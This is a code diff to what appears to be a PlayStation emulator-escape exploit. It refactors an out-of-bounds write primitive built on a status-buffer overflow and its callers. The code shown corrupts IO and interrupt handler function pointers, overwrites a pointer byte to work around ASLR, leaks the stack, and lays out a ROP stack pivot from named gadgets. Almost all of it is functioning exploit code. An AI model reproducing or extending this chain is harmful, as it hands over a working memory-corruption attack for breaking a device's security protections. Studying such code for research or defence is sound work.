@@ -5,6 +5,8 @@
 #include <ps2/cdvd.hpp>
 #include <offsets/ps/eboot/eboot.hpp>
 
+uint32_t PS::Breakout::nStatusIndex = 0;
+
 uint32_t PS::Breakout::ebootDiff = 0;
 uint64_t PS::Breakout::stackAddress = 0;
 #ifdef LIB_KERNEL_LEAKED
@@ -111,10 +113,15 @@ void PS::Breakout::resetNStatusIndex()
         if (i > BREAKOUT_BUSY_TIMEOUT)
             break;
     }
+
+    PS::Breakout::nStatusIndex = 0;
 }
 
 void PS::Breakout::setOOBindex(uint32_t index)
 {
+    if (PS::Breakout::nStatusIndex == index)
+        return;
+
     PS::Breakout::resetNStatusIndex();
 
     uint8_t overflow[0x60 + sizeof(index)] = {};
@@ -125,50 +132,50 @@ void PS::Breakout::setOOBindex(uint32_t index)
     overflow[0x60 + 2] = index >> 16;
     overflow[0x60 + 3] = index >> 24;
 
+    PS::Breakout::nStatusIndex = index;
+
     PS::Breakout::sStatusBufferOverflow(overflow, sizeof(overflow));
 }
 
-uint32_t PS::Breakout::writeOOB(uint32_t address, uint8_t value, bool ignoreZeros)
+uint32_t PS::Breakout::writeOOB(uint32_t address, uint8_t value)
 {
-    if (ignoreZeros && value == 0)
-        return 1;
-
     PS::Breakout::setOOBindex(address - N_STATUS_BUFFER);
     *(uint8_t*)NCMD_SEND = value;
+    PS::Breakout::nStatusIndex++;
     return 1;
 }
 
-uint32_t PS::Breakout::writeOOB(uint32_t address, uint16_t value, bool ignoreZeros)
+uint32_t PS::Breakout::writeOOB(uint32_t address, uint16_t value)
 {
-    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0), ignoreZeros);
-    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8), ignoreZeros);
+    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0));
+    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8));
     return 2;
 }
 
-uint32_t PS::Breakout::writeOOB(uint32_t address, uint32_t value, bool ignoreZeros)
+uint32_t PS::Breakout::writeOOB(uint32_t address, uint32_t value)
 {
-    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0), ignoreZeros);
-    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8), ignoreZeros);
-    PS::Breakout::writeOOB(address + 2, (uint8_t)(value >> 16), ignoreZeros);
-    PS::Breakout::writeOOB(address + 3, (uint8_t)(value >> 24), ignoreZeros);
+    PS::Breakout::writeOOB(address + 0, (uint8_t)(value >> 0));
+    PS::Breakout::writeOOB(address + 1, (uint8_t)(value >> 8));
+    PS::Breakout::writeOOB(address + 2, (uint8_t)(value >> 16));
+    PS::Breakout::writeOOB(address + 3, (uint8_t)(value >> 24));
     return 4;
 }
 
-uint32_t PS::Breakout::writeOOB(uint32_t address, uint64_t value, bool ignoreZeros)
+uint32_t PS::Breakout::writeOOB(uint32_t address, uint64_t value)
 {
-    PS::Breakout::writeOOB(address + 0, (uint32_t)value, ignoreZeros);
-    PS::Breakout::writeOOB(address + 4, (uint32_t)(value >> 32), ignoreZeros);
+    PS::Breakout::writeOOB(address + 0, (uint32_t)value);
+    PS::Breakout::writeOOB(address + 4, (uint32_t)(value >> 32));
     return 8;
 }
 
 void PS::Breakout::restoreReadHandler()
 {
-    PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, EBOOT(IO_REGISTER_READ_HANDLER_ORIGINAL), false);
+    PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, EBOOT(IO_REGISTER_READ_HANDLER_ORIGINAL));
 }
 
 void PS::Breakout::restoreWriteHandler()
 {
-    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, EBOOT(INTERRUPT_WRITE_HANDLER_ORIGINAL), false);
+    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, EBOOT(INTERRUPT_WRITE_HANDLER_ORIGINAL));
 }
 
 uint32_t PS::Breakout::callGadgetAndGetResult(uint32_t gadget, uint32_t gadgetSize)
@@ -178,11 +185,11 @@ uint32_t PS::Breakout::callGadgetAndGetResult(uint32_t gadget, uint32_t gadgetSi
 
     // Corrupt the function pointer
     if (gadgetSize == 4)
-        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, gadget, false);
+        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, gadget);
 
     // Overwrite just the least significant byte, for before we've defeated ASLR
     else if (gadgetSize == 1)
-        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, (uint8_t)gadget, false);
+        PS::Breakout::writeOOB(IO_REGISTER_READ_HANDLERS, (uint8_t)gadget);
 
     // Call the corrupted function pointer
     return *io;
@@ -213,7 +220,7 @@ uint64_t PS::Breakout::leakStack()
 void PS::Breakout::setupGadgetWithArgument(uint32_t gadget)
 {
     // Corrupt jump target
-    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, gadget, false);
+    PS::Breakout::writeOOB(INTERRUPT_WRITE_HANDLERS, gadget);
 }
 
 void PS::Breakout::setupROP()
@@ -222,13 +229,13 @@ void PS::Breakout::setupROP()
     // [1]: Push RSI (stage1Address), Call stage1Address+0x3B ([2])
     // [2]: Pop RCX (rcx = ? from call), Pop RSP (rsp = stage1Address)
     // [3]: Pop RSP (rsp = rop_chain_native)
-    PS::Breakout::writeOOB(STAGE_1 + 0x08, PVAR_TO_NATIVE(PS::Breakout::chain), true);
+    PS::Breakout::writeOOB(STAGE_1 + 0x08, PVAR_TO_NATIVE(PS::Breakout::chain));
 
     // [3] pop rsp ; ret
-    PS::Breakout::writeOOB(STAGE_1 + 0x00, GADGET(POP_RSP_RET), true);
+    PS::Breakout::writeOOB(STAGE_1 + 0x00, GADGET(POP_RSP_RET));
 
     // [2] pop rcx ; fld st0, st5 ; clc ; pop rsp ; ret ;
-    PS::Breakout::writeOOB(STAGE_1 + 0x3B, GADGET(POP_RCX_FLD_ST0_ST5_CLC_POP_RSP_RET), true);
+    PS::Breakout::writeOOB(STAGE_1 + 0x3B, GADGET(POP_RCX_FLD_ST0_ST5_CLC_POP_RSP_RET));
 
     // [1] push rsi ; add bh, cl ; call qword [rsi+0x3B] ;
     PS::Breakout::setupGadgetWithArgument(GADGET(PUSH_RSI_ADD_BH_CL_CALL_QWORD_OB_RSI_PLUS_0X3B_CB));
